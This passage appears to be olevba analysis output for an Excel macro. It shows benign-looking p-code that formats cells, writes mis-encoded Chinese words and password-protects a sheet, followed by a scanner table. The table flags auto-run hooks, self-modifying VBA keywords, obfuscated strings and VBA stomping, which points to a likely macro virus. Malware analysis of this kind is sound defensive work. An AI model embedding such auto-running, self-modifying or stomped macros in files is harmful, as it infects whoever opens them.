' 	LitStr 0x0006 "A1:Q32"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #177:
' 	Ld Selection 
' 	ArgsMemCall ClearContents 0x0000 
' Line #178:
' 	Ld xlNone 
' 	Ld xlDiagonalDown 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #179:
' 	Ld xlNone 
' 	Ld xlDiagonalUp 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #180:
' 	Ld xlNone 
' 	Ld xlEdgeLeft 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #181:
' 	Ld xlNone 
' 	Ld xlEdgeTop 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #182:
' 	Ld xlNone 
' 	Ld xlEdgeBottom 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #183:
' 	Ld xlNone 
' 	Ld xlEdgeRight 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #184:
' 	Ld xlNone 
' 	Ld xlInsideVertical 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #185:
' 	Ld xlNone 
' 	Ld xlInsideHorizontal 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #186:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #187:
' 	LitDI2 0x0013 
' 	MemStWith ColorIndex 
' Line #188:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #189:
' 	Ld xlAutomatic 
' 	MemStWith PatternColorIndex 
' Line #190:
' 	EndWith 
' Line #191:
' 	LitDI2 0x0014 
' 	Ld Selection 
' 	MemSt RowHeight 
' Line #192:
' 	LitDI2 0x0007 
' 	Ld Selection 
' 	MemSt ColumnWidth 
' Line #193:
' 	LitDI2 0x000C 
' 	Ld ActiveWindow 
' 	MemSt ScrollRow 
' Line #194:
' 	LitStr 0x0005 "A1:a3"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #195:
' 	LitDI2 0x000A 
' 	Ld Selection 
' 	MemSt RowHeight 
' Line #196:
' 	LitStr 0x0005 "A1:c1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #197:
' 	LitDI2 0x000B 
' 	Ld Selection 
' 	MemSt ColumnWidth 
' Line #198:
' 	LitStr 0x0006 "D5:F23"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #199:
' 	Ld xlNone 
' 	Ld xlDiagonalDown 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #200:
' 	Ld xlNone 
' 	Ld xlDiagonalUp 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #201:
' 	StartWithExpr 
' 	Ld xlEdgeLeft 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	With 
' Line #202:
' 	Ld xlContinuous 
' 	MemStWith LineStyle 
' Line #203:
' 	Ld xlThick 
' 	MemStWith Weight 
' Line #204:
' 	LitDI2 0x002E 
' 	MemStWith ColorIndex 
' Line #205:
' 	EndWith 
' Line #206:
' 	StartWithExpr 
' 	Ld xlEdgeTop 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	With 
' Line #207:
' 	Ld xlContinuous 
' 	MemStWith LineStyle 
' Line #208:
' 	Ld xlThick 
' 	MemStWith Weight 
' Line #209:
' 	LitDI2 0x002E 
' 	MemStWith ColorIndex 
' Line #210:
' 	EndWith 
' Line #211:
' 	StartWithExpr 
' 	Ld xlEdgeBottom 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	With 
' Line #212:
' 	Ld xlContinuous 
' 	MemStWith LineStyle 
' Line #213:
' 	Ld xlThick 
' 	MemStWith Weight 
' Line #214:
' 	LitDI2 0x002E 
' 	MemStWith ColorIndex 
' Line #215:
' 	EndWith 
' Line #216:
' 	StartWithExpr 
' 	Ld xlEdgeRight 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	With 
' Line #217:
' 	Ld xlContinuous 
' 	MemStWith LineStyle 
' Line #218:
' 	Ld xlThick 
' 	MemStWith Weight 
' Line #219:
' 	LitDI2 0x002E 
' 	MemStWith ColorIndex 
' Line #220:
' 	EndWith 
' Line #221:
' 	Ld xlNone 
' 	Ld xlInsideVertical 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #222:
' 	Ld xlNone 
' 	Ld xlInsideHorizontal 
' 	Ld Selection 
' 	ArgsMemLd Borders 0x0001 
' 	MemSt LineStyle 
' Line #223:
' 	LitStr 0x0006 "D5:F23"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #224:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #225:
' 	LitDI2 0x0002 
' 	MemStWith ColorIndex 
' Line #226:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #227:
' 	Ld xlAutomatic 
' 	MemStWith PatternColorIndex 
' Line #228:
' 	EndWith 
' Line #229:
' 	LitStr 0x0006 "D5:F23"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #230:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #231:
' 	LitStr 0x000B "·ÂËÎ_GB2312"
' 	MemStWith New 
' Line #232:
' 	LitStr 0x0004 "¼Ó´Ö"
' 	MemStWith FontStyle 
' Line #233:
' 	LitDI2 0x0012 
' 	MemStWith Size 
' Line #234:
' 	LitVarSpecial (False)
' 	MemStWith Strikethrough 
' Line #235:
' 	LitVarSpecial (False)
' 	MemStWith Superscript 
' Line #236:
' 	LitVarSpecial (False)
' 	MemStWith Subscript 
' Line #237:
' 	LitVarSpecial (False)
' 	MemStWith OutlineFont 
' Line #238:
' 	LitVarSpecial (False)
' 	MemStWith Shadow 
' Line #239:
' 	Ld xlUnderlineStyleNone 
' 	MemStWith Underline 
' Line #240:
' 	Ld xlAutomatic 
' 	MemStWith ColorIndex 
' Line #241:
' 	EndWith 
' Line #242:
' 	LitStr 0x0007 "D19:D22"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #243:
' 	LitDI2 0x000E 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #244:
' 	Ld xlCenter 
' 	Ld Selection 
' 	MemSt HorizontalAlignment 
' Line #245:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #246:
' 	LitStr 0x0002 "F8"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #247:
' 	LitStr 0x0002 "ÎÄ"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #248:
' 	LitStr 0x0002 "F9"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #249:
' 	LitStr 0x0002 "Ã÷"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #250:
' 	LitStr 0x0003 "F10"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #251:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #252:
' 	LitStr 0x0003 "F11"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #253:
' 	LitStr 0x0002 "·î"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #254:
' 	LitStr 0x0003 "F12"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #255:
' 	LitStr 0x0002 "Ï×"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #256:
' 	LitStr 0x0003 "F13"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #257:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #258:
' 	LitStr 0x0003 "F14"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #259:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #260:
' 	LitStr 0x0003 "F15"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #261:
' 	LitStr 0x0002 "ÍÅ"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #262:
' 	LitStr 0x0003 "F16"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #263:
' 	LitStr 0x0002 "½á"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #264:
' 	LitStr 0x0003 "F17"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #265:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #266:
' 	LitStr 0x0003 "F18"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #267:
' 	LitStr 0x0002 "½ø"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #268:
' 	LitStr 0x0003 "F19"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #269:
' 	LitStr 0x0002 "È¡"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #270:
' 	LitStr 0x0003 "F20"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #271:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #272:
' 	LitStr 0x0002 "E6"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #273:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #274:
' 	LitStr 0x0002 "E7"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #275:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #276:
' 	LitStr 0x0002 "E8"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #277:
' 	LitStr 0x0002 "ÇÚ"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #278:
' 	LitStr 0x0002 "E9"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #279:
' 	LitStr 0x0002 "·Ü"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #280:
' 	LitStr 0x0003 "E10"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #281:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #282:
' 	LitStr 0x0003 "E11"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #283:
' 	LitStr 0x0002 "ÑÏ"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #284:
' 	LitStr 0x0003 "E12"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #285:
' 	LitStr 0x0002 "½÷"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #286:
' 	LitStr 0x0003 "E13"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #287:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #288:
' 	LitStr 0x0003 "E14"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #289:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #290:
' 	LitStr 0x0003 "E15"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #291:
' 	LitStr 0x0002 "Çó"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #292:
' 	LitStr 0x0003 "E16"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #293:
' 	LitStr 0x0002 "Êµ"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #294:
' 	LitStr 0x0003 "E17"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #295:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #296:
' 	LitStr 0x0003 "E18"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #297:
' 	LitStr 0x0002 "´´"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #298:
' 	LitStr 0x0003 "E19"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #299:
' 	LitStr 0x0002 "ÐÂ"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #300:
' 	LitStr 0x0003 "E20"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #301:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #302:
' 	LitStr 0x0003 "E21"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #303:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #304:
' 	LitStr 0x0003 "d19"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #305:
' 	LitStr 0x0001 "S"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #306:
' 	LitStr 0x0003 "D20"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #307:
' 	LitStr 0x0001 "U"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #308:
' 	LitStr 0x0003 "D21"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #309:
' 	LitStr 0x0001 "F"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #310:
' 	LitStr 0x0003 "D22"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #311:
' 	LitStr 0x0001 "E"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #312:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #313:
' 	LitStr 0x0008 "We11come"
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed DrawingObjects 
' 	LitVarSpecial (True)
' 	ParamNamed Contents 
' 	LitVarSpecial (True)
' 	ParamNamed Scenarios 
' 	Ld ActiveSheet 
' 	ArgsMemCall Protect 0x0004 
' Line #314:
' 	Label theEnd 
' Line #315:
' 	EndIfBlock 
' Line #316:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Base64    |IAD                 |SUFE                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

